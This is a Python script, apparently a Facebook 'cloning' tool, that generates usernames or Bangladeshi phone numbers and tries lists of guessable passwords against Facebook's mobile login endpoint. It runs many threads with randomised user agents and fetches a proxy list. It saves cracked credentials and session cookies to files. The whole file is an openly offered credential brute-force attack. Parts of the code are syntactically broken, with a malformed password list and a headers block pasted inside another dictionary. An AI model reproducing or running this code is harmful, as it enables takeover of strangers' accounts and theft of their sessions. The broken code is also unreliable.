import os, sys, time, json, random, re, string, platform, base64, uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu

try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'  #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m'  # PUTIH
M = '\x1b[1;91m'  # MERAH
H = '\x1b[1;92m'  # HIJAU
K = '\x1b[1;93m'  # KUNING
B = '\x1b[1;94m'  # BIRU
U = '\x1b[1;95m'  # UNGU
O = '\x1b[1;96m'  # BIRU MUDA
N = '\x1b[0m'  # WARNA MATI
A = '\x1b[1;90m'  # WARNA ABU ABU
BN = '\x1b[1;107m'  # BELAKANG PUTIH
BBL = '\x1b[1;106m'  # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m'  # BELAKANG PINK
BB = '\x1b[1;104m'  # BELAKANG BIRU
BK = '\x1b[1;103m'  # BELAKANG KUNING
BH = '\x1b[1;102m'  # BELAKANG HIJAU
BM = '\x1b[1;101m'  # BELAJANG MERAH
BA = '\x1b[1;100m'  # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
loop = 0
oks = []
cps = []
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
try:
    prox = requests.get(
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:
    print('')
prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 11'
    b = random.choice(['3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17'])
    c = ' en-us; GT-'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.46'
    uaku2 = (f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
logo = ("""

                               ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
                               ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
                               ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█


\033[1;91m\033[1;41m\033[1;97m              Be you, The world will adjust               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[👨] AUTHOR    :\033[1;32m RJ X SHANTO 
\033[1;32m[📖] GITHUB    :\033[1;32m RJ SHANTO
\033[1;32m[😇] FACEBOOK  :\033[1;32m SH AN TO
\033[1;32m[💉] TOOLS TYPE:\033[1;32m FREE
\033[1;32m[📅] VERSION   :\033[1;32m 1.0
\033[1;32m[🚀] STATUS    :\033[1;32m WORKING
\033[1;32m[⏳] UPDATE    :\033[1;32m AUTO-UPDATE [ON]
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m WORKING ONLY ON MOBILE DATA\033[;0m\033[1;91m═══>\033[1;92m""")


class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        print(" \033[1;97m[1] EMAIL ID CLONING     \033[1;91m[WORKING] ")
        print(" \033[1;97m[2] USERNAME CLONING     \033[1;35m[BEST]")
        print(" \033[1;97m[3] VIP RANDOM CLONING   \033[1;33m[FIRE]")
        print(" \033[1;97m[0] Exit")
        print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        Snigdho = input(" [√] Choose : ")
        if Snigdho in ["1", "01"]:
            v1()
        if Snigdho in ["2", "02"]:
            v2()
        if Snigdho in ["3", "03"]:
            v3()
        if Snigdho in [" 0", "00"]:
            exit()
        else:
            exit()


def v1():
    user = []
    os.system('clear')
    print(logo)
    kode = input(' [🔥]  TARGET FIRST NAME : ')
    kodex = input(' [🔥] TARGET LAST NAME :  ')
    print(' [🤝] example Domain : @gmail.com, @yahoo.com ')
    domain = input(' [📧]  Input Domain  : ')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1, 4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [🔥]  Total ids:\033[1;92m ' + tl)
        print(f"\033[1;97m [🔥]  Target Domain:\033[1;92m {domain}")
        print(' \033[1;97m[🔥]  The process has been started')
        print(' [🔥]  Wait for ids ')
        print(50 * '_')
        for guru in user:
            uid = kode + kodex + guru + domain
            pwx = [kode, kodex, kode + kodex, kode + '123', kode + '1234', kode + '12345', kode + guru, kodex + '123',
                   kodex + '1234', kodex + '12345']
            yaari.submit(rcrack1, uid, pwx, tl)
    print(50 * '_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50 * '_')


def v2():
    user = []
    os.system('clear')
    print(logo)
    kode = input(' [🔥]  TARGET FIRST NAME : ')
    kodex = input(' [🔥] TARGET LAST NAME :  ')
    domain = '.'
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1, 4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [🔥]  Total ids:\033[1;92m ' + tl)
        print(f"\033[1;97m [♥]  Target Doamin:\033[1;92m Facebook CLONING (name)")
        print(' \033[1;97m[♥]  The process has been started')
        print(' [♥]  Wait for ids ')
        print(50 * '_')
        for guru in user:
            uid = kode + domain + kodex + guru
            pwx = [fuck,'bangladesh','hridoy','sabbir','sadiya','fatema','nusrat','shahin','alamin','free fire','alvi',]
                   kodex + '1234', kodex + '12345']
            yaari.submit(rcrack1, uid, pwx, tl)
    print(50 * '_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50 * '_')


def v3():
    user = []
    os.system('clear')
    print(logo)
    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014,+88013,+88015")
    print(
        "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    kode = input(' [📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    domain = ' RANDOM VIP CLONING '
    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;33m[♥]  TOTAL IDS :\033[1;92m ' + tl)
        print(f"\033[1;33m[♥]  YOUR TERGET CRACK MENU:\033[1;92m {domain}")
        print(' \033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
        print(' \033[1;33m[♥]  WAIT FOR IDS ')
        print(50 * '_')
        for guru in user:
            uid = kode + kodex + kod + guru
            pwx = [kode + kodex + kod + guru, kod + guru, kodex + guru, kode + kodex + kod, 'mababa', 'sadiya', 'shahin', 'sarmin', 'bangla', 'fatema', 'sabbir', 'alamin', 'free fire', '405060', '809010']
            yaari.submit(rcrack1, uid, pwx, tl)
    print(50 * '_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50 * '_')


def rcrack1(uid, pwx, tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(
                '\r[\033[1;92mRJ\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r' % (
                loop, tl, len(oks), len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": ps,
                "login": "Log In"
                header_freefb = {'authority': 'm.facebook.com',
    'method':'POST',
    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
    'scheme':'https',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'x-asbd-id': '198387',
    'x-fb-lsd': 'AVoPmsopEAk',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; V2023 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]',}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
                              data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'datr' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[RJ-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🌺] : {coki}")
                open('/sdcard/RJ/ok.txt', 'a').write(uid + ' | ' + ps + '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RJ-CP❌] {uid}|{ps}")
                open('/sdcard/RJ-CP.txt', 'a').write(uid + ' | ' + ps + ' \n')
                cps.append(uid)
                break
            else:
                continue
        loop += 1
        sys.stdout.write(
            f'\r\033[m[RJ-Z💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] ' % (loop, len(oks))),
        sys.stdout.flush()
    except:pass


Main()
